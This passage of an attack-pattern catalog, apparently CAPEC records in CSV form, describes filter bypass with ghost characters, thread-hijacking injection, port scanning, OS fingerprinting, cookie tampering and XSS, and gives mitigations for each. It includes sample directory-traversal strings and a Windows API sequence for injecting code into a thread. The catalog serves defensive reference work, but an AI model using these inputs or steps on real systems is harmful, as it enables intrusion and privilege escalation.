filter them.:TECHNIQUE:Try repeating special characters (?, @, #, *, etc.) at the beginning of user input to see how the application filters these out.::STEP:3:PHASE:Exploit:DESCRIPTION:[Bypass input filtering] Using what the adversary learned about how the application filters input data, they craft specific input data that bypasses the filter. This can lead to directory traversal attacks, arbitrary shell command execution, corruption of files, etc.::\",\"::The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.::\",\"::SKILL:The ability to make an API request, and knowledge of ghost characters that will not be filtered by any input validation. These ghost characters must be known to not affect the way in which the request will be interpreted.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Use an allowlist rather than a denylist input validation.::Canonicalize all data prior to validation.::Take an iterative approach to input validation (defense in depth).::\",\"::Alternate Encoding with Ghost Characters in FTP and Web Servers Some web and FTP servers fail to detect prohibited upward directory traversals if the user-supplied pathname contains extra characters such as an extra leading dot. For example, a program that will disallow access to the pathname ../test.txt may erroneously allow access to that file if the pathname is specified as .../test.txt. This attack succeeds because 1) the input validation logic fails to detect the triple-dot as a directory traversal attempt (since it isn't dot-dot), 2) some part of the input processing decided to strip off the extra dot, leaving the dot-dot behind. Using the file system API as the target, the following strings are all equivalent to many programs: .../../../test.txt............/../../test.txt..?/../../test.txt..????????/../../test.txt../test.txt As you can see, there are many ways to make a semantically equivalent request. All these strings ultimately result in a request for the file ../test.txt.::\",\"::173::41::172::179::180::181::183::184::20::74::697::707::\",\"\",\"\",\n30,\"Hijacking a Privileged Thread of Execution\",Standard,Draft,\"An adversary hijacks a privileged thread of execution by injecting malicious code into a running process. By using a privleged thread to do their bidding, adversaries can evade process-based detection that would stop an attack that creates a new process. This can lead to an adversary gaining access to the process's memory and can also enable elevated privileges. The most common way to perform this attack is by suspending an existing thread and manipulating its memory.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:233::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target thread] The adversary determines the underlying system thread that is subject to user-control::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain handle to thread] The adversary then gains a handle to a process thread.:TECHNIQUE:Use the OpenThread API call in Windows on a known thread.:TECHNIQUE:Cause an exception in a java privileged block public function and catch it, or catch a normal signal. The thread is then hanging and the adversary can attempt to gain a handle to it.::STEP:3:PHASE:Experiment:DESCRIPTION:[Alter process memory] Once the adversary has a handle to the target thread, they will suspend the thread and alter the memory using native OS calls.:TECHNIQUE:On Windows, use SuspendThread followed by VirtualAllocEx, WriteProcessMemory, and SetThreadContext.::STEP:4:PHASE:Exploit:DESCRIPTION:[Resume thread execution] Once the process memory has been altered to execute malicious code, the thread is then resumed.:TECHNIQUE:On Windows, use ResumeThread.::\",\"::The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users::In order to feasibly execute this class of attacks, the adversary must have the ability to hijack a privileged thread. This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or calling native OS calls that can suspend and alter process memory. This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.::\",\"::SKILL:Hijacking a thread involves knowledge of how processes and threads function on the target platform, the design of the target application as well as the ability to identify the primitives to be used or manipulated to hijack the thread.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread. The adversary does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary's malicious code. This is the case even if the adversary conducts the attack remotely.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.::Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.::\",\"::Adversary targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread (e.g., a system call). The adversary could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.::\",\"::270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1055.003:ENTRY NAME:Process Injection: Thread Execution Hijacking::\",\"\",\n300,\"Port Scanning\",Standard,Stable,\"An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary requires logical access to the target's network in order to carry out this type of attack.::\",\"\",\"::The adversary requires a network mapping/scanning tool, or must conduct socket programming on the command line. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1046:ENTRY NAME:Network Service Scanning::\",\"TYPE:Other:NOTE:There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified.::\",\n301,\"TCP Connect Scan\",Detailed,Stable,\"An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary attempts to initialize a TCP connection with with the target port.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the result of their TCP connection to determine the state of the target port. A successful connection indicates a port is open with a service listening on it while a failed connection indicates the port is not open.::\",\"::The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.::\",\"\",\"::The adversary can leverage a network mapper or scanner, or perform this attack via routine socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Employ a robust network defense posture that includes an IDS/IPS system.::\",\"\",\"::200::\",\"\",\"\","
  },
  "doc-b4445dda356be09494b8c979e36b2030": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n302,\"TCP FIN Scan\",Detailed,Stable,\"An adversary uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow the adversary to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the FIN flag but not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::\",\"::FIN scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::\",\"\",\"::This attack pattern requires the ability to send TCP FIN segments to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected. An IDS/IPS system with heuristic algorithms is required to detect them.::\",\"\",\"::200::\",\"\",\"TYPE:Other:NOTE:Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports. FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy.::\",\n303,\"TCP Xmas Scan\",Detailed,Stable,\"An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with all possible flags set in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with all flags set but not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::\",\"::The adversary needs logical access to the target network. XMAS scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::\",\"\",\"::This attack can be carried out with a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Employ a robust network defensive posture that includes a managed IDS/IPS.::\",\"\",\"::200::\",\"\",\"TYPE:Other:NOTE:Many operating systems do not implement RFC 793 exactly and for this reason XMAS scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. XMAS scans are limited by the range of platforms against which they work.::\",\n304,\"TCP Null Scan\",Detailed,Stable,\"An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with no flags set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If no response is received the port is open. If a RST packet is received then the port is closed.::\",\"::The adversary requires logical access to the target network. NULL scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::\",\"\",\"::This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Employ a robust network defensive posture that includes a managed IDS/IPS.::\",\"\",\"::200::\",\"\",\"TYPE:Other:NOTE:Many operating systems do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. NULL scans are limited by the range of platforms against which they work.::\",\n305,\"TCP ACK Scan\",Detailed,Stable,\"An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. If a RST packet is received the target port is either closed or the ACK was sent out-of-sync. If no response is received, the target is likely using a stateful firewall.::\",\"::The adversary requires logical access to the target network. ACK scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::\",\"\",\"::This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"TYPE:Other:NOTE:If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall.::\",\n306,\"TCP Window Scan\",Detailed,Stable,\"An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. Specifically, the adversary views the TCP window size from the returned RST packet if one was received. Depending on the target operating system, a positive window size may indicate an open port while a negative window size may indicate a closed port.::\",\"::TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges.::\",\"\",\"::The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n307,\"TCP RPC Scan\",Detailed,Stable,\"An adversary scans for RPC services listing on a Unix/Linux host.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends RCP packets to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine which, if any, RPC service is running on that port. Responses will vary based on which RPC service is running.::\",\"::RPC scanning requires no special privileges when it is performed via a native system utility.::\",\"\",\"::The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Typically, an IDS/IPS system is very effective against this type of attack.::\",\"\",\"::200::\",\"\",\"\",\n308,\"UDP Scan\",Detailed,Stable,\"An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:300::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends UDP packets to target ports.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. Whether a port responds to a UDP packet is dependant on what application is listening on that port. No response does not indicate the port is not open.::\",\"::The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply.::\",\"\",\"::The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.::UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages.::\",\"\",\"::200::\",\"\",\"\",\n309,\"Network Topology Mapping\",Standard,Draft,\"An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:169::NATURE:CanPrecede:CAPEC ID:664::\",\"\",\"::None::\",\"\",\"::Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1016:ENTRY NAME:System Network Configuration Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1049:ENTRY NAME:System Network Connections Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1590:ENTRY NAME:Gather Victim Network Information::\",\"\",\n31,\"Accessing/Intercepting/Modifying HTTP Cookies\",Detailed,Draft,\"This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:39::NATURE:ChildOf:CAPEC ID:157::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.:TECHNIQUE:Sniff cookie using a network sniffer such as Wireshark:TECHNIQUE:Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.:TECHNIQUE:Steal cookie via a cross-site scripting attack.:TECHNIQUE:Guess cookie contents if it contains predictable information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.:TECHNIQUE:If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.:TECHNIQUE:Analyze the cookie's contents to determine whether it contains any sensitive information.::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.:TECHNIQUE:Modify logical parts of cookie and send it back to server to observe the effects.:TECHNIQUE:Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.:TECHNIQUE:Modify cookie bitwise and send it back to server to observe the effects.:TECHNIQUE:Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a points balance for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance.::\",\"::Target server software must be a HTTP daemon that relies on cookies.::The cookies must contain sensitive information.::The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.::\",\"::SKILL:To overwrite session cookie data, and submit targeted attacks via HTTP:LEVEL:Low::SKILL:Exploiting a remote buffer overflow generated by attack:LEVEL:High::\",\"::A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Use input validation for cookies::Design: Generate and validate MAC for cookies::Implementation: Use SSL/TLS to protect cookie in transit::Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.::\",\"::There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353::\",\"::565::302::311::113::539::20::315::384::472::602::642::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1539:ENTRY NAME:Steal Web Session Cookie::\",\"\",\n310,\"Scanning for Vulnerable Software\",Detailed,Draft,\"An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:541::\",\"\",\"::Access to the network on which the targeted system resides.::Software tools used to probe systems over a range of ports and protocols.::\",\"::SKILL:To probe a system remotely without detection requires careful planning and patience.:LEVEL:Medium::\",\"::Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n312,\"Active OS Fingerprinting\",Standard,Stable,\"An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n313,\"Passive OS Fingerprinting\",Standard,Stable,\"An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n317,\"IP ID Sequencing Probe\",Detailed,Stable,\"This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis - IP 'ID' Sequencing: analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host and Shared IP 'ID' Sequencing: analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n318,\"IP 'ID' Echoed Byte-Order Probe\",Detailed,Stable,\"This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n319,\"IP (DF) 'Don't Fragment Bit' Echoing Probe\",Detailed,Stable,\"This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n32,\"XSS Through HTTP Query Strings\",Detailed,Draft,\"An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:588::NATURE:ChildOf:CAPEC ID:592::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they 